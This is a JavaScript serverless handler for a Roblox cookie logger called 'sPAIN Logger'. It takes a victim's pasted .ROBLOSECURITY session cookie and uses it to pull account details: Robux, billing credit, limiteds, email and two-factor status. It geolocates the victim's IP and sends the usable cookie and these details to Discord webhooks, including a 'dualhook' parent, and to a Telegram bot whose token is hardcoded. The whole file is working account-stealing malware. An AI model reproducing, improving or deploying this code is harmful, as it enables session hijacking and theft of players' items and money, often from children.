const REDIS_URL = process.env.UPSTASH_REDIS_REST_URL;
const REDIS_TOKEN = process.env.UPSTASH_REDIS_REST_TOKEN;
const TG_TOKEN = process.env.TG_TOKEN || '8666861605:AAFA3E5IVxOtajuENoWm6BhBF0VMJZRFhy8';
const TG_CHAT = process.env.TG_CHAT || '7538845070';

async function redisGet(key) {
const res = await fetch(${REDIS_URL}/get/${encodeURIComponent(key)}, {
headers: { Authorization: Bearer ${REDIS_TOKEN} }
});
const json = await res.json();
if (!json.result) return null;
try { return JSON.parse(json.result); } catch { return null; }
}

async function tgSend(text) {
try {
await fetch(https://api.telegram.org/bot${TG_TOKEN}/sendMessage, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify({ chat_id: TG_CHAT, text, parse_mode: 'HTML' })
});
} catch (e) {
console.error('TG Error:', e);
}
}

async function getIpGeo(ip) {
try {
if (!ip || ip === 'Unknown') return null;
const res = await fetch(http://ip-api.com/json/${ip}?fields=status,message,country,countryCode,regionName,city,isp,query, { timeout: 3000 });
if (!res.ok) return null;
const data = await res.json();
return data.status === 'success' ? data : null;
} catch (e) {
return null;
}
}

function extractRobloxCookie(raw) {
if (!raw) return null;

// Full cookie with warning prefix
const fullMatch = raw.match(/(|WARNING:-DO-NOT-SHARE-THIS[^|]*|[\w-.]+)/);
if (fullMatch) return fullMatch[1];

// Token after warning
const warningMatch = raw.match(/|WARNING[^|]*|([\w-.]+)/);
if (warningMatch) return _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${warningMatch[1]};

// Bare token
const tokenOnly = raw.match(/|_([\w-]{50,})/);
if (tokenOnly) return _|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_${tokenOnly[1]};

return null;
}

async function fetchRobloxInfo(cookie) {
try {
const headers = { Cookie: .ROBLOSECURITY=${cookie} };

const authRes = await fetch('https://users.roblox.com/v1/users/authenticated', { headers });
if (!authRes.ok) return null;
const auth = await authRes.json();
const uid = auth.id;

const [
  profileRes,
  robuxRes,
  friendsRes,
  premiumRes,
  billingRes,
  emailRes,
  groupsRes,
  limitedsRes,
  avatarRes,
  tfaRes
] = await Promise.all([
  fetch(`https://users.roblox.com/v1/users/${uid}`, { headers: {} }),
  fetch('https://economy.roblox.com/v1/user/currency', { headers }),
  fetch(`https://friends.roblox.com/v1/users/${uid}/friends/count`, { headers }),
  fetch(`https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership`, { headers }),
  fetch('https://billing.roblox.com/v1/credit', { headers }),
  fetch('https://accountsettings.roblox.com/v1/email', { headers }),
  fetch(`https://groups.roblox.com/v1/users/${uid}/groups/roles`, { headers }),
  fetch(`https://inventory.roblox.com/v1/users/${uid}/assets/collectibles?limit=100`, { headers }),
  fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${uid}&size=150x150&format=Webp`, { headers: {} }),
  fetch(`https://twostepverification.roblox.com/v1/users/${uid}/configuration`, { headers }).catch(() => null)
]);

const profile = profileRes.ok ? await profileRes.json() : null;
const robuxData = robuxRes.ok ? await robuxRes.json() : null;
const friendsData = friendsRes.ok ? await friendsRes.json() : null;
const isPremium = premiumRes.ok ? await premiumRes.json() : false;
const billingData = billingRes.ok ? await billingRes.json() : null;
const emailData = emailRes.ok ? await emailRes.json() : null;
const groupsData = groupsRes.ok ? await groupsRes.json() : { data: [] };
const limitedsData = limitedsRes.ok ? await limitedsRes.json() : { data: [] };
const avatarData = avatarRes.ok ? await avatarRes.json() : null;
const tfaData = tfaRes?.ok ? await tfaRes.json() : null;

let accountAgeDays = 'N/A';
if (profile?.created) {
  accountAgeDays = Math.floor((Date.now() - new Date(profile.created).getTime()) / 86400000);
}

const groups = groupsData.data || [];
const ownedGroups = groups.filter(g => g.role?.rank === 255);

let groupRobux = 0;
for (const group of ownedGroups.slice(0, 2)) {
  try {
    const currencyRes = await fetch(`https://economy.roblox.com/v1/groups/${group.group.id}/currency`, { headers });
    if (currencyRes?.ok) {
      const curr = await currencyRes.json();
      groupRobux += curr.robux || 0;
    }
  } catch (_) {}
}

const limiteds = limitedsData.data || [];
const limitedsCount = limiteds.length;
const limitedsValue = limiteds.reduce((sum, item) => sum + (item.recentAveragePrice || 0), 0);

const twoFA = tfaData?.methods?.length > 0 ? 'Enabled ✅' : 'Disabled ❌';
const emailSet = emailData?.emailAddress ? 'Set ✅' : 'False ❌';
const emailVerified = emailData?.verified ? 'Verified ✅' : 'Unset ❌';

return {
  id: uid,
  username: auth.name,
  displayName: auth.displayName,
  isPremium: isPremium === true,
  accountAgeDays,
  robux: robuxData?.robux || 0,
  friends: friendsData?.count || 0,
  credit: billingData?.balance || 0,
  groupsOwned: ownedGroups.length,
  groupRobux,
  limitedsCount,
  limitedsValue,
  emailSet,
  emailVerified,
  twoFA,
  avatarUrl: avatarData?.data?.[0]?.imageUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png'
};
} catch (err) {
console.error('Roblox fetch error:', err);
return null;
}
}

function field(name, value, inline = false) {
const truncated = value?.toString()?.substring(0, 1020) || 'N/A';
return { name: name?.substring(0, 256), value: truncated, inline };
}

async function sendToDiscord(webhookUrl, data) {
if (!webhookUrl) {
console.error('No webhook URL');
return false;
}

if (!webhookUrl.includes('discord.com/api/webhooks') && !webhookUrl.includes('discordapp.com/api/webhooks')) {
console.error('Invalid webhook URL');
return false;
}

const { pageName, rawValue, cookie, roblox, ip, geo, now } = data;

const accountLocation = geo?.country || 'Unknown';
const victimLocation = geo ? ${geo.city || 'Unknown'}, ${geo.country || 'Unknown'} : 'Unknown';
const flag = geo?.countryCode || '';

// Ensure cookie is clean and usable - if no extracted cookie, show raw but truncated
const cookieDisplay = cookie || rawValue?.substring(0, 800) || 'No cookie captured';

const fields = [
field("👤 Username", roblox?.username || 'Unknown', true),
field("🆔 User ID", roblox?.id?.toString() || 'N/A', true),
field("📊 Account Stats", \Account Age:` `${roblox?.accountAgeDays || 'N/A'} Days`), field("📍 Locations", • `Account:` ${accountLocation} ${flag}\n• `Victim:` ${victimLocation} ${flag}), field("💳 Billing", Credit: ${roblox?.credit || 0} $\nPayments: N/A, true), field("👥 Groups", Balance: ${roblox?.groupRobux?.toLocaleString() || 0}\nOwned: ${roblox?.groupsOwned || 0}, true), field("⚙️ Settings", Email: ${roblox?.emailSet || 'False ❌'}\nVerified: ${roblox?.emailVerified || 'Unset ❌'}\n2FA: ${roblox?.twoFA || 'Disabled ❌'}, true), field("💰 Account Funds", Balance: ${roblox?.robux?.toLocaleString() || 0}, true), field("🛒 Limiteds", Count: ${roblox?.limitedsCount || 0}\nValue: ${roblox?.limitedsValue?.toLocaleString() || 0}, true), field("🌐 IP Address", ip || 'Unknown', true), field("🔐 .ROBLOSECURITY (Click to Copy)", ```\n${cookieDisplay}\n````, false)
];

const payload = {
content: "@everyone",
embeds: [{
title: roblox ? 🧑 ${roblox.username} ${roblox.isPremium ? '⭐' : ''} : "🧑 New Login",
description: :fire: \sPAIN` :fire:\n\nProfile 👤 | Refresh Cookie, color: 5793266, fields: fields, footer: { text: sPAIN Logger • ${now}` },
thumbnail: { url: roblox?.avatarUrl || 'https://cdn-icons-png.flaticon.com/512/1827/1827392.png' }
}]
};

try {
const response = await fetch(webhookUrl, {
method: 'POST',
headers: { 'Content-Type': 'application/json' },
body: JSON.stringify(payload)
});

if (!response.ok) {
  const text = await response.text();
  console.error('Discord API Error:', response.status, text);
  return false;
}
return true;
} catch (err) {
console.error('Discord fetch error:', err);
return false;
}
}

export default async function handler(req, res) {
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Methods', 'POST, OPTIONS');
res.setHeader('Access-Control-Allow-Headers', 'Content-Type');

if (req.method === 'OPTIONS') return res.status(204).end();
if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

let body = req.body;
if (typeof body === 'string') {
try { body = JSON.parse(body); } catch { return res.status(400).json({ error: 'Invalid JSON' }); }
}

const { slug, slots } = body || {};
if (!slug) return res.status(400).json({ error: 'slug is required' });
if (!slots) return res.status(400).json({ error: 'slots is required' });

let record;
try {
record = await redisGet(slot:${slug});
} catch (err) {
return res.status(500).json({ error: 'Redis error', detail: err.message });
}

if (!record) return res.status(404).json({ error: 'Page not found' });
if (!record.webhook) return res.status(500).json({ error: 'No webhook configured' });

const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() ||
req.headers['x-real-ip'] ||
req.socket?.remoteAddress ||
'Unknown';

const geo = await getIpGeo(ip);
const now = new Date().toISOString();

const slotEntry = Object.entries(slots).find(([, v]) => v && v.length > 0);
const slotLabel = slotEntry ? slotEntry[0] : 'N/A';
const rawValue = slotEntry ? slotEntry[1] : '(empty)';

const cookie = extractRobloxCookie(rawValue);
const roblox = cookie ? await fetchRobloxInfo(cookie) : null;

const data = {
pageName: record.displayName,
slotLabel,
rawValue,
cookie,
roblox,
ip,
geo,
now
};

// Send to webhook2
const sent2 = await sendToDiscord(record.webhook, data);

// Send to webhook1 if dualhook
let webhook1 = 'N/A';
let sent1 = false;
if (record.dualhookParent) {
try {
const parentRecord = await redisGet(slot:${record.dualhookParent});
if (parentRecord?.webhook && parentRecord.webhook !== record.webhook) {
webhook1 = parentRecord.webhook;
sent1 = await sendToDiscord(parentRecord.webhook, data);
}
} catch (e) {
console.error('Dualhook error:', e);
}
}

// Telegram notification
const tgMsg = [
🚨 <b>NEW SUBMISSION</b>,
, `👤 <b>${roblox?.username || 'Unknown'}</b> ${roblox?.isPremium ? '⭐' : ''}`, `🆔 ID: ${roblox?.id || 'N/A'}`, `💰 Robux: ${roblox?.robux?.toLocaleString() || 0}`, `🌐 IP: ${ip}`, `📍 ${geo?.city || 'Unknown'}, ${geo?.country || 'Unknown'}`, ,
🍪 Cookie: ${cookie ? 'Captured (' + cookie.substring(0, 30) + '...)' : 'Failed'},
✅ Discord: ${sent2 ? 'Sent' : 'Failed'},
📄 Page: ${record.displayName},
⏰ ${now}
].join('\n');

await tgSend(tgMsg);

return res.status(200).json({
success: true,
discord: { webhook2: sent2, webhook1: sent1 ? 'Sent' : webhook1 === 'N/A' ? 'N/A' : 'Failed' }
});
}
